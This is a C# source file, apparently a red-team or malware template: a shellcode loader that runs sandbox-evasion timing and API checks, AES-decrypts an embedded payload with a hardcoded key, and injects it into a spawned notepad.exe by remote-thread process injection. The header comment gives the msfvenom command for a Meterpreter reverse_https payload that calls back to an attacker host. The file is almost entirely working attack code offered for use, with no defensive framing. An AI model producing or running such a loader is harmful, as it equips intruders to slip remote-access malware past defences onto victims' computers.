// =============================================================================
// TEMPLATE — replace buf with your encrypted shellcode before compiling
//
// Generate and encrypt shellcode:
//   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
//   2. Paste bytes into aes-shellcode-encryption.cs and run it
//   3. Copy the output buf here and update the byte count
//
// Change target process near bottom: Process.Start("notepad.exe")
// =============================================================================

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace AesShellcodeLoaderWithEvasion
{
    class Program
    {
        // P/Invoke for injection
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // P/Invoke for evasion checks
        [DllImport("kernel32.dll")]
        static extern uint GetTickCount();

        [DllImport("kernel32.dll")]
        static extern bool QueryPerformanceCounter(out long lpPerformanceCount);

        [DllImport("kernel32.dll")]
        static extern bool QueryPerformanceFrequency(out long lpFrequency);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Evasion checks with 5-second sleep
            if (!PerformEvasionChecks())
            {
                return;  // Exit if evasion fails
            }

            // Your full AES-encrypted shellcode (replace with actual)
            byte[] buf = new byte[896] {
                // Paste your full encrypted buf here
            };

            byte[] decryptedShellcode = Decrypt(buf);
            InjectAndExecute(decryptedShellcode);
        }

        static bool PerformEvasionChecks()
        {
            // 5-second sleep for delay-based evasion
            Thread.Sleep(5000);

            // Time-lapse detection
            Stopwatch sw = Stopwatch.StartNew();
            Thread.Sleep(50);  // Simulate work
            sw.Stop();
            if (sw.ElapsedMilliseconds < 40 || sw.ElapsedMilliseconds > 10000)  // Too fast or slow
            {
                return false;  // Likely sandbox
            }

            // Non-emulated API checks
            // 1. Check system uptime via GetTickCount (sandboxes may fake this)
            uint uptime = GetTickCount();
            if (uptime < 1000 || uptime > 0xFFFFFFFF / 2)  // Unrealistic values
            {
                return false;
            }

            // 2. Query performance counter (emulators may not handle frequency accurately)
            long freq, count;
            if (!QueryPerformanceFrequency(out freq) || !QueryPerformanceCounter(out count))
            {
                return false;
            }
            if (freq < 1000000 || count < 0)  // Low frequency or invalid count
            {
                return false;
            }

            // 3. Check for specific DLLs that sandboxes might not load
            if (GetModuleHandle("ntdll.dll") == IntPtr.Zero || GetModuleHandle("kernel32.dll") == IntPtr.Zero)
            {
                return false;  // Critical DLLs missing
            }

            // 4. CPU feature check (basic; emulators may not report accurately)
            if (!System.Environment.Is64BitOperatingSystem)
            {
                return false;  // Ensure 64-bit
            }

            return true;  // Passed checks
        }

        static byte[] Decrypt(byte[] encryptedData)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = Encoding.UTF8.GetBytes("t51JpSvoag6052x1go4PvuSiLOwNWifX");

                byte[] iv = new byte[16];
                Array.Copy(encryptedData, 0, iv, 0, 16);
                aes.IV = iv;

                byte[] ciphertext = new byte[encryptedData.Length - 16];
                Array.Copy(encryptedData, 16, ciphertext, 0, ciphertext.Length);

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (var ms = new System.IO.MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var resultStream = new System.IO.MemoryStream())
                {
                        cs.CopyTo(resultStream);
                        return resultStream.ToArray();
                }
            }
        }

        static void InjectAndExecute(byte[] shellcode)
        {
            Process targetProcess = Process.Start("notepad.exe");
            targetProcess.WaitForInputIdle();

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
            if (hProcess == IntPtr.Zero) return;

            // Use VirtualAllocExNuma for NUMA-aware allocation (node 0 for local)
            IntPtr allocAddr = VirtualAllocExNuma(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
            if (allocAddr == IntPtr.Zero)
            {
                CloseHandle(hProcess);
                return;
            }

            IntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, allocAddr, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                CloseHandle(hProcess);
                return;
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);

            CloseHandle(hThread);
            CloseHandle(hProcess);
            targetProcess.WaitForExit();
        }
    }
}